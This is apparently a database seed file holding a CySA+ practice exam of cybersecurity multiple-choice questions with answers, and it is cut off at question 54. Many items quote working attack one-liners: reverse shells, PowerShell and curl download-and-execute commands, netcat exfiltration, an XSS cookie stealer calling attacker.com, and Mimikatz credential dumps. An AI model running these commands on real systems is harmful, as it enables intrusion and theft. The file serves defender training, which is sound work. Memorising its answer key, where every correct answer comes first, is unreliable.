db.tests.insertOne({
  "category": "cysa",
  "testId": 8,
  "testName": "CySa+ Practice Test #8 (Very Challenging)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A security analyst detects the following Base64-encoded command in system logs:\n\n`bmMgLWUgL2Jpbi9iYXNoID4gL2Rldi90Y3AvMTkyLjE2OC4xLjEwLzQ0NDQ=`\n\nWhich action should the analyst take FIRST?",
      "options": [
        "Decode the Base64 string and analyze its behavior",
        "Allow the execution since it's a common admin command",
        "Block outbound connections to 192.168.1.10",
        "Ignore the log entry unless further suspicious activity is observed"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the string reveals `nc -e /bin/bash > /dev/tcp/192.168.1.10/4444`, indicating a reverse shell attempt.",
      "examTip": "Always decode Base64-encoded payloads before taking action to understand intent."
    },
    {
      "id": 2,
      "question": "A security analyst reviews the following network traffic capture:\n\n```\n18:45:12.123456 IP 10.0.0.5.13579 > 203.0.113.25.443: Flags [P.], seq 1:49, ack 100, win 512\n18:45:12.125678 IP 203.0.113.25.443 > 10.0.0.5.13579: Flags [P.], seq 100:200, ack 50, win 512\n```\n\nWhat is the MOST likely explanation for this traffic pattern?",
      "options": [
        "An encrypted command-and-control (C2) channel",
        "A legitimate HTTPS session",
        "A TLS handshake error",
        "A normal system update request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Outbound connections to a suspicious external IP on port 443 could indicate an encrypted C2 channel.",
      "examTip": "Monitor outbound traffic to unknown IPs over HTTPS and look for beaconing behavior."
    },
    {
      "id": 3,
      "question": "An attacker successfully exploits a web application and executes the following command:\n\n`curl -s -X POST -d 'cmd=cat /etc/shadow' http://target.com/admin.php`\n\nWhat vulnerability is being exploited?",
      "options": [
        "Remote code execution (RCE)",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is injecting system commands via a POST request, characteristic of a remote code execution (RCE) vulnerability.",
      "examTip": "Use web application firewalls (WAFs) and sanitize input to prevent RCE attacks."
    },
    {
      "id": 4,
      "question": "A forensic investigator analyzes an infected endpoint and finds the following command in PowerShell logs:\n\n`$client = New-Object System.Net.WebClient; $client.DownloadFile('http://malicious-site.com/payload.exe', 'C:\\Users\\Public\\payload.exe'); Start-Process 'C:\\Users\\Public\\payload.exe'`\n\nWhat is the impact of this command?",
      "options": [
        "Downloads and executes a malicious payload",
        "Encrypts local files for ransomware deployment",
        "Modifies Windows security policies",
        "Creates a new administrator account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a malicious file, indicating an attempt to install malware.",
      "examTip": "Monitor PowerShell execution logs and restrict unauthorized script execution."
    },
    {
      "id": 5,
      "question": "A network security team detects a large number of outbound DNS queries for domains with randomly generated subdomains. What is the MOST likely cause?",
      "options": [
        "A botnet using Domain Generation Algorithm (DGA) for C2 communication",
        "A vulnerability scanner probing external domains",
        "A misconfigured DNS resolver",
        "A legitimate content delivery network (CDN) request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware frequently generates randomized domains for command-and-control communication to avoid detection.",
      "examTip": "Use DNS filtering and machine learning-based anomaly detection to identify DGA-based threats."
    },
    {
      "id": 6,
      "question": "An attacker gains access to a Linux system and modifies the following file:\n\n```\nexport PATH=/tmp/malicious:$PATH\n```\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Hijacking system commands by modifying the PATH variable",
        "Granting root privileges to a malicious process",
        "Extracting credentials from memory",
        "Redirecting traffic to a phishing site"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By modifying the PATH variable, the attacker ensures that their malicious binaries are executed instead of legitimate system commands.",
      "examTip": "Monitor for unauthorized modifications to environment variables and enforce execution control policies."
    },
    {
      "id": 7,
      "question": "A security analyst detects an unauthorized user running the following command on a Windows machine:\n\n`powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')`\n\nWhat is the significance of the `-ep bypass` flag?",
      "options": [
        "Bypasses PowerShell execution policy restrictions",
        "Disables Windows Defender for the session",
        "Hides the script from system logs",
        "Forces PowerShell to run in an isolated memory space"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-ep bypass` flag allows PowerShell to execute scripts without being blocked by execution policies, commonly used in attacks.",
      "examTip": "Enforce PowerShell logging and restrict execution policies to prevent unauthorized scripts."
    },
    {
      "id": 8,
      "question": "A forensic analyst finds an attacker modifying a file with the following command:\n\n`echo 'malicious_code' >> /dev/kmem`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Injecting a rootkit into kernel memory",
        "Altering system logs to evade detection",
        "Exfiltrating data using ICMP tunneling",
        "Modifying user privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Writing to `/dev/kmem` allows direct modification of kernel memory, often used in rootkit attacks.",
      "examTip": "Prevent unauthorized access to `/dev/kmem` and enforce kernel module integrity checks."
    },
    {
      "id": 9,
      "question": "A penetration tester successfully exploits an Active Directory environment and executes the following command:\n\n`dcsync /user:admin /domain:corp.local`\n\nWhat is the purpose of this command?",
      "options": [
        "Extracting NTLM hashes from the domain controller",
        "Enumerating Active Directory users",
        "Performing Kerberoasting to steal service account credentials",
        "Creating a new domain administrator account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command allows an attacker to dump NTLM password hashes directly from the domain controller.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 10,
      "question": "An attacker executes the following command:\n\n`certutil -urlcache -split -f http://malicious.com/malware.exe malware.exe`\n\nWhat is the intent of this command?",
      "options": [
        "Downloading and storing a malicious file using a built-in Windows utility",
        "Disabling Windows security updates",
        "Exfiltrating encrypted data to a remote server",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `certutil` command is a living-off-the-land (LotL) technique to download and execute malware without triggering antivirus alerts.",
      "examTip": "Monitor `certutil.exe` usage and restrict outbound connections from non-administrative users."
    },
    {
      "id": 11,
      "question": "A security analyst captures the following network traffic:\n\n```\n12:05:34.456789 IP 10.1.1.15.54567 > 198.51.100.20.53: Flags [P.], length 100\n12:05:34.457123 IP 198.51.100.20.53 > 10.1.1.15.54567: Flags [P.], length 200\n```\n\nWhat is the MOST likely explanation for this traffic?",
      "options": [
        "DNS tunneling for data exfiltration",
        "A legitimate DNS query response",
        "A SYN flood attack",
        "A vulnerability scanner performing reconnaissance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS tunneling involves sending encoded data within DNS queries and responses, often used for covert data exfiltration.",
      "examTip": "Monitor DNS query sizes and frequencies to detect potential tunneling activity."
    },
    {
      "id": 12,
      "question": "A penetration tester executes the following command:\n\n`responder -I eth0`\n\nWhat is the purpose of this command?",
      "options": [
        "Intercepting and poisoning network authentication requests",
        "Scanning for open SMB shares",
        "Enumerating domain controllers in an Active Directory environment",
        "Exfiltrating credentials via HTTP requests"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder is a tool used for poisoning LLMNR/NBT-NS requests to capture and relay credentials in network environments.",
      "examTip": "Disable LLMNR and NBT-NS on corporate networks to prevent credential capture attacks."
    },
    {
      "id": 13,
      "question": "A security analyst finds the following entry in a compromised Linux system's bash history:\n\n`chmod +s /bin/bash`\n\nWhat is the attacker attempting to achieve?",
      "options": [
        "Setting the SUID bit on `/bin/bash` to allow privilege escalation",
        "Hiding malicious processes from system logs",
        "Preventing users from executing commands",
        "Creating a hidden backdoor account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting the SUID bit allows unprivileged users to execute `/bin/bash` with root privileges, enabling privilege escalation.",
      "examTip": "Regularly audit file permissions and monitor SUID binaries to prevent privilege escalation."
    },
    {
      "id": 14,
      "question": "A security engineer detects an attacker attempting to exploit an Active Directory environment using the following command:\n\n`Invoke-Mimikatz -DumpCreds`\n\nWhat is the purpose of this command?",
      "options": [
        "Dumping credentials from memory",
        "Creating a Golden Ticket attack",
        "Performing a Kerberoasting attack",
        "Enumerating domain controllers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz is used to extract credentials from memory, allowing attackers to escalate privileges and move laterally.",
      "examTip": "Enable Windows Defender Credential Guard to prevent credential dumping attacks."
    },
    {
      "id": 15,
      "question": "A security analyst detects the following request in Apache access logs:\n\n`GET /?cmd=cat+/etc/passwd HTTP/1.1`\n\nWhat type of attack is being attempted?",
      "options": [
        "Command injection",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Directory traversal"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is attempting command injection by passing a system command (`cat /etc/passwd`) via an HTTP GET request.",
      "examTip": "Sanitize user input and use allowlists for acceptable commands to prevent injection attacks."
    },
    {
      "id": 16,
      "question": "An attacker successfully exploits a system and executes the following command:\n\n`meterpreter > migrate -P explorer.exe`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Migrating a backdoor process into Explorer.exe to avoid detection",
        "Stealing NTLM password hashes",
        "Executing a pass-the-hash attack",
        "Enumerating domain user accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Migrating the Meterpreter session to `explorer.exe` helps evade detection by hiding within a legitimate process.",
      "examTip": "Monitor process injections and use endpoint protection tools to detect suspicious migrations."
    },
    {
      "id": 17,
      "question": "A forensic analyst finds the following encoded PowerShell command in event logs:\n\n`powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat should the analyst do FIRST?",
      "options": [
        "Decode the command and analyze its intent",
        "Execute the command in a sandboxed environment",
        "Ignore the event unless further evidence is found",
        "Block all PowerShell scripts on the endpoint"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` flag indicates Base64 encoding, requiring decoding to determine its true intent before taking action.",
      "examTip": "Always decode and analyze encoded scripts before execution or blocking."
    },
    {
      "id": 18,
      "question": "A security analyst detects suspicious SMB traffic originating from an internal workstation to multiple network shares. Which tool would BEST help analyze this activity?",
      "options": [
        "Wireshark",
        "John the Ripper",
        "Burp Suite",
        "Nikto"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Wireshark can capture and analyze SMB traffic to detect unauthorized file access or lateral movement attempts.",
      "examTip": "Monitor SMB traffic for unusual activity and restrict access to sensitive network shares."
    },
    {
      "id": 19,
      "question": "An attacker exploits a misconfigured cron job and executes the following command:\n\n`echo 'nc -e /bin/bash 192.168.1.20 4444' > /tmp/cronjob.sh && chmod +x /tmp/cronjob.sh && echo '* * * * * /tmp/cronjob.sh' >> /etc/crontab`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing persistence with a reverse shell executed every minute",
        "Executing a privilege escalation exploit",
        "Dumping credentials from a Linux system",
        "Scanning for open ports on the local network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is modifying `/etc/crontab` to run a reverse shell every minute, maintaining persistence.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 20,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -Pn -sS --script smb-vuln-ms17-010 <target>`\n\nWhat is the tester attempting to do?",
      "options": [
        "Identify systems vulnerable to EternalBlue (MS17-010)",
        "Scan for open SMB shares",
        "Perform an ARP poisoning attack",
        "Bypass network firewalls using SYN scans"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-vuln-ms17-010` script checks for the EternalBlue vulnerability, which allows remote code execution via SMB.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 21,
      "question": "A security analyst notices repeated attempts to authenticate against an SSH server using the following username patterns: `admin`, `root`, `test`, `backup`, `support`. What type of attack is MOST likely occurring?",
      "options": [
        "Brute-force attack",
        "Pass-the-hash attack",
        "Kerberoasting",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The repeated authentication attempts using common usernames indicate a brute-force attack against the SSH server.",
      "examTip": "Use fail2ban or SSH key-based authentication to mitigate brute-force attacks."
    },
    {
      "id": 22,
      "question": "A forensic investigator discovers the following command in a Windows system log:\n\n`wevtutil cl Security`\n\nWhat is the attacker's intent?",
      "options": [
        "Clearing Windows event logs to evade detection",
        "Dumping credentials from memory",
        "Scanning for vulnerabilities in system logs",
        "Creating a new administrator account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `wevtutil cl Security` command clears Windows event logs, a common technique attackers use to cover their tracks.",
      "examTip": "Enable event log forwarding and use SIEM tools to detect log clearing attempts."
    },
    {
      "id": 23,
      "question": "An attacker exploits a web application and injects the following payload into a form field:\n\n`<script>fetch('http://attacker.com/steal?cookie='+document.cookie);</script>`\n\nWhat type of attack is this?",
      "options": [
        "Stored cross-site scripting (XSS)",
        "SQL injection",
        "Remote code execution (RCE)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The injected JavaScript is designed to steal cookies from users, a common technique in stored XSS attacks.",
      "examTip": "Use Content Security Policy (CSP) headers and input sanitization to prevent XSS attacks."
    },
    {
      "id": 24,
      "question": "A penetration tester executes the following command:\n\n`crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd'`\n\nWhat is the tester attempting to do?",
      "options": [
        "Authenticate to an SMB share using a known username and password",
        "Exploit a known SMB vulnerability",
        "Perform a brute-force attack against SMB",
        "Enumerate domain controllers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`crackmapexec smb` tests authentication credentials against SMB shares, often used in lateral movement attacks.",
      "examTip": "Monitor SMB authentication attempts and enforce account lockout policies."
    },
    {
      "id": 25,
      "question": "An attacker successfully exploits a Windows machine and runs the following command:\n\n`rundll32.exe shell32.dll,Control_RunDLL ncpa.cpl`\n\nWhat is the attacker's likely objective?",
      "options": [
        "Opening the network connections GUI to modify network settings",
        "Extracting user credentials from memory",
        "Disabling Windows Defender",
        "Escalating privileges to SYSTEM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command opens the network connections panel, which an attacker may use to alter network settings for persistence.",
      "examTip": "Monitor suspicious `rundll32.exe` executions as they are commonly used in malware and living-off-the-land attacks."
    },
    {
      "id": 26,
      "question": "A forensic analyst finds the following command executed on a compromised Linux system:\n\n`echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh && /tmp/.backdoor.sh`\n\nWhat is the purpose of this command?",
      "options": [
        "Creating a persistent reverse shell",
        "Executing a denial-of-service attack",
        "Dumping password hashes",
        "Exfiltrating system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command creates and executes a script that establishes a reverse shell connection to an attacker's machine.",
      "examTip": "Monitor for unauthorized scripts and block outgoing traffic to suspicious IPs."
    },
    {
      "id": 27,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sU -p 161 <target>`\n\nWhat is the tester trying to achieve?",
      "options": [
        "Enumerate SNMP services",
        "Scan for open RDP ports",
        "Perform a brute-force attack",
        "Detect SQL injection vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 161 is used for SNMP, and scanning it may reveal misconfigured or vulnerable network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings for security."
    },
    {
      "id": 28,
      "question": "An attacker runs the following command on a compromised system:\n\n`schtasks /create /sc onlogon /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Persistence via a scheduled task that executes malware on user login",
        "Clearing Windows event logs",
        "Scanning the local network for open ports",
        "Performing a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command is setting up a scheduled task that runs a malicious executable every time a user logs in.",
      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
    },
    {
      "id": 29,
      "question": "A network security analyst detects repeated outbound requests to `169.254.169.254` from multiple cloud-hosted VMs. What is the MOST likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A routine network discovery scan",
        "A benign software update process",
        "An NTP synchronization request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud metadata services, which attackers often exploit to obtain credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 to prevent exploitation."
    },
    {
      "id": 30,
      "question": "A security analyst detects an attacker executing the following PowerShell command:\n\n`powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\"`\n\nWhat is the significance of the `IEX(New-Object Net.WebClient).DownloadString()` function?",
      "options": [
        "Executes a remote PowerShell script directly in memory",
        "Disables Windows security policies",
        "Modifies Windows registry settings",
        "Creates a hidden user account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a remote PowerShell script in memory, a common technique for fileless malware.",
      "examTip": "Enforce PowerShell script logging and block suspicious outbound web requests."
    },
    {
      "id": 31,
      "question": "A security analyst finds the following entry in an Apache web server log:\n\n`192.168.1.100 - - [25/Feb/2025:14:22:15 +0000] \"GET /index.php?file=../../../../etc/passwd HTTP/1.1\" 200 5120`\n\nWhat type of attack is being attempted?",
      "options": [
        "Directory traversal",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Remote file inclusion"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The request includes `../../../../etc/passwd`, which attempts to access system files via directory traversal.",
      "examTip": "Use input validation and restrict access to sensitive directories to prevent directory traversal attacks."
    },
    {
      "id": 32,
      "question": "A forensic analyst reviewing endpoint logs finds the following PowerShell command:\n\n`powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxp://malicious-site.com/payload.ps1')\"`\n\nWhat is the intent of this command?",
      "options": [
        "Download and execute a remote PowerShell script in memory",
        "Disable Windows Defender real-time protection",
        "Modify Active Directory group policies",
        "Exfiltrate credentials from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `IEX` (Invoke-Expression) command executes a downloaded script directly in memory, avoiding disk detection.",
      "examTip": "Monitor PowerShell execution logs and block unauthorized outbound connections."
    },
    {
      "id": 33,
      "question": "An attacker executes the following command on a compromised Linux system:\n\n`nohup nc -e /bin/bash 203.0.113.10 4444 &`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Establish a persistent reverse shell",
        "Scan the local network for open ports",
        "Modify user privileges",
        "Execute a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nohup` command ensures the process persists after logout, and Netcat is used to establish a reverse shell.",
      "examTip": "Monitor outbound connections and block unauthorized remote shells."
    },
    {
      "id": 34,
      "question": "A penetration tester runs the following Nmap command:\n\n`nmap -Pn --script smb-enum-shares,smb-enum-users 192.168.1.100`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate SMB shares and user accounts",
        "Detect vulnerabilities in a web application",
        "Perform an SSH brute-force attack",
        "Identify firewall misconfigurations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-enum-shares` and `smb-enum-users` scripts retrieve a list of shared files and user accounts over SMB.",
      "examTip": "Disable SMBv1 and enforce authentication to prevent unauthorized enumeration."
    },
    {
      "id": 35,
      "question": "A security analyst discovers multiple login attempts to an internal VPN from IP addresses geolocated in multiple countries within a short time frame. What is the MOST likely cause?",
      "options": [
        "Credential stuffing attack",
        "Brute-force attack",
        "Kerberoasting attack",
        "Pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing occurs when attackers use previously leaked credentials across multiple services.",
      "examTip": "Enforce MFA and monitor failed login attempts for signs of automated credential stuffing."
    },
    {
      "id": 36,
      "question": "An attacker exploits a Windows machine and executes the following command:\n\n`reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Persistence by executing malware at system startup",
        "Disabling Windows security policies",
        "Creating a hidden user account",
        "Dumping password hashes from the registry"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is adding a registry key that will execute malware every time the system starts.",
      "examTip": "Monitor registry modifications and restrict write access to startup keys."
    },
    {
      "id": 37,
      "question": "A network security analyst detects an unusual increase in outbound ICMP packets containing large amounts of data. What is the MOST likely cause?",
      "options": [
        "ICMP-based data exfiltration (Ping Tunnel)",
        "A normal network health check",
        "A botnet command-and-control communication",
        "A denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ICMP tunneling allows attackers to exfiltrate data using ping packets with hidden payloads.",
      "examTip": "Monitor ICMP traffic for anomalies and restrict outbound ICMP where possible."
    },
    {
      "id": 38,
      "question": "A penetration tester executes the following command:\n\n`bloodhound-python -c All -u user -p password -d domain.local`\n\nWhat is the purpose of this command?",
      "options": [
        "Enumerating Active Directory relationships to find privilege escalation paths",
        "Performing Kerberoasting to extract service account credentials",
        "Dumping NTLM password hashes from the domain controller",
        "Scanning for open RDP ports on a target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
    },
    {
      "id": 39,
      "question": "A forensic analyst is investigating a Linux system and finds the following entry in the `/etc/passwd` file:\n\n`backdoor:x:0:0::/root:/bin/bash`\n\nWhat does this indicate?",
      "options": [
        "An attacker has created a backdoor root account",
        "A user account with restricted privileges",
        "A normal system administrator account",
        "A misconfigured service account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The UID `0` and GID `0` indicate a root-level account, suggesting an attacker has created a backdoor.",
      "examTip": "Monitor for unauthorized modifications to `/etc/passwd` and enforce least privilege access."
    },
    {
      "id": 40,
      "question": "A security analyst detects the following DNS queries originating from a compromised endpoint:\n\n```\nqwerty123.example.com\nasdfgh456.example.com\nzxcvbn789.example.com\n```\n\nWhat is the MOST likely explanation?",
      "options": [
        "Domain Generation Algorithm malware using randomized subdomains",
        "A normal system update process",
        "A vulnerability scanner probing external hosts",
        "An NTP synchronization request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware generates random subdomains to evade detection while communicating with command-and-control servers.",
      "examTip": "Use DNS filtering and behavioral analysis to detect and block DGA-based malware."
    },
    {
      "id": 41,
      "question": "A forensic investigator is analyzing a compromised Linux system and finds the following entry in `/etc/crontab`:\n\n`* * * * * root curl -s http://malicious.example.com/payload.sh | bash`\n\nWhat is the attacker's goal?",
      "options": [
        "Maintaining persistence by executing a remote script every minute",
        "Exfiltrating system logs to an attacker-controlled server",
        "Performing a denial-of-service attack",
        "Dumping password hashes from the system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The cron job downloads and executes a remote script every minute, ensuring persistence on the compromised system.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 42,
      "question": "A penetration tester successfully exploits a Windows system and executes the following command:\n\n`mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit`\n\nWhat is the objective of this command?",
      "options": [
        "Dumping credentials from memory",
        "Performing a pass-the-hash attack",
        "Escalating privileges to SYSTEM",
        "Clearing Windows event logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz extracts stored credentials from memory, allowing attackers to escalate privileges or move laterally.",
      "examTip": "Use Credential Guard and restrict access to LSASS to prevent credential dumping."
    },
    {
      "id": 43,
      "question": "A security analyst detects suspicious activity on an endpoint where a user account suddenly has domain administrator privileges. Further investigation reveals the following command was executed:\n\n`dsquery group -name \"Domain Admins\" | dsmod group -addmbr CN=compromised_user,CN=Users,DC=corp,DC=local`\n\nWhat has the attacker done?",
      "options": [
        "Escalated the compromised user to a domain administrator",
        "Modified Active Directory group policies",
        "Performed a Kerberoasting attack",
        "Created a backdoor service account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dsmod` command modifies Active Directory groups, adding the compromised user to the `Domain Admins` group.",
      "examTip": "Monitor group membership changes and enforce least privilege access policies."
    },
    {
      "id": 44,
      "question": "A security team detects an attacker attempting to exploit an RDP server by running the following command:\n\n`xfreerdp /v:192.168.1.50 /u:administrator /p:P@ssw0rd123`\n\nWhat is the likely goal of this attack?",
      "options": [
        "Gaining unauthorized remote access via RDP",
        "Performing an SSH brute-force attack",
        "Enumerating SMB shares on the network",
        "Scanning for open ports on a remote system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `xfreerdp` command is used to connect to an RDP server, and the attacker is attempting to log in using stolen or guessed credentials.",
      "examTip": "Enforce strong RDP authentication and use network segmentation to restrict access."
    },
    {
      "id": 45,
      "question": "A security analyst captures the following log entry from a web application firewall (WAF):\n\n```\nGET /index.php?username=admin' OR '1'='1'--&password=123456\n```\n\nWhat type of attack is being attempted?",
      "options": [
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Session hijacking"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The request contains `' OR '1'='1'--`, which attempts to bypass authentication by modifying the SQL query logic.",
      "examTip": "Use prepared statements and input validation to mitigate SQL injection attacks."
    },
    {
      "id": 46,
      "question": "An attacker successfully exploits an unpatched Windows system and runs the following command:\n\n`wmic process call create \"cmd.exe /c net user hacker P@ssw0rd123 /add\"`\n\nWhat is the attacker's goal?",
      "options": [
        "Creating a new backdoor user account",
        "Dumping NTLM hashes from the system",
        "Performing an RDP brute-force attack",
        "Disabling Windows security services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using `wmic` to create a new user account for persistence.",
      "examTip": "Monitor user account creation logs and enforce strong authentication controls."
    },
    {
      "id": 47,
      "question": "A security analyst detects an attacker executing the following command on a compromised endpoint:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Executing JavaScript in a Windows environment for code execution",
        "Dumping credentials from memory",
        "Disabling Windows Defender",
        "Modifying firewall rules"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command exploits `rundll32.exe` to execute JavaScript in Windows, often used for malware deployment.",
      "examTip": "Monitor `rundll32.exe` executions and restrict script execution policies."
    },
    {
      "id": 48,
      "question": "An attacker performs the following command on a Linux server:\n\n`tar -cf /dev/null /etc/* | nc 203.0.113.10 4444`\n\nWhat is the attacker's objective?",
      "options": [
        "Exfiltrating system configuration files to a remote server",
        "Compressing system logs to evade detection",
        "Executing a denial-of-service attack",
        "Injecting a rootkit into kernel memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command archives and sends `/etc/*` (which includes sensitive system files) to an attacker's machine over Netcat.",
      "examTip": "Monitor network traffic for unusual outbound data transfers and block unauthorized Netcat usage."
    },
    {
      "id": 49,
      "question": "A security team detects a large number of DNS requests for randomized subdomains under a single domain. What is the MOST likely cause?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for C2 communication",
        "A legitimate cloud service dynamically generating subdomains",
        "A brute-force attack against DNS records",
        "A web application vulnerability scan"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA-based malware generates randomized subdomains to evade domain blocking and establish C2 connections.",
      "examTip": "Use DNS filtering and machine learning-based anomaly detection to identify and block DGA-based threats."
    },
    {
      "id": 50,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Attempting to brute-force SNMP community strings",
        "Enumerating open RDP ports",
        "Scanning for SQL injection vulnerabilities",
        "Bypassing network firewalls"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide unauthorized access to network devices.",
      "examTip": "Disable SNMP if not required or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 51,
      "question": "A security analyst detects the following PowerShell command executed on a Windows server:\n\n`powershell -exec bypass -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')\"`\n\nWhat is the attacker's objective?",
      "options": [
        "Executing a remote PowerShell script in memory to evade detection",
        "Dumping NTLM hashes from memory",
        "Creating a new domain administrator account",
        "Disabling Windows Defender protection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `IEX` (Invoke-Expression) function downloads and executes a PowerShell script directly in memory, a common fileless attack technique.",
      "examTip": "Enable PowerShell logging and restrict execution policies to detect and prevent fileless malware attacks."
    },
    {
      "id": 52,
      "question": "A forensic investigator analyzing a compromised Linux system finds the following command in bash history:\n\n`echo 'bash -i >& /dev/tcp/192.168.1.20/4444 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh && /tmp/.backdoor.sh`\n\nWhat is the attacker's goal?",
      "options": [
        "Creating a persistent reverse shell connection",
        "Performing a brute-force attack against the system",
        "Dumping password hashes from the system",
        "Injecting a kernel-level rootkit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script creates a reverse shell connection to the attacker's machine, allowing remote access.",
      "examTip": "Monitor unauthorized script execution and block outbound connections to untrusted hosts."
    },
    {
      "id": 53,
      "question": "A penetration tester executes the following command:\n\n`nmap -p 445 --script=smb-vuln-ms17-010 <target>`\n\nWhat is the tester trying to accomplish?",
      "options": [
        "Detecting whether the target is vulnerable to EternalBlue",
        "Enumerating SMB shares on the target system",
        "Performing an ARP poisoning attack",
        "Scanning for Kerberoasting vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script checks if the target is vulnerable to EternalBlue (MS17-010), which allows remote code execution via SMB.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 54,
      "question": "A network security analyst notices an increase in outbound DNS queries containing long, random-looking subdomains. What is the MOST likely explanation?",
      "options": [
        "A malware infection using a Domain Generation Algorithm (DGA) for C2 communication",
        "A legitimate software update process",
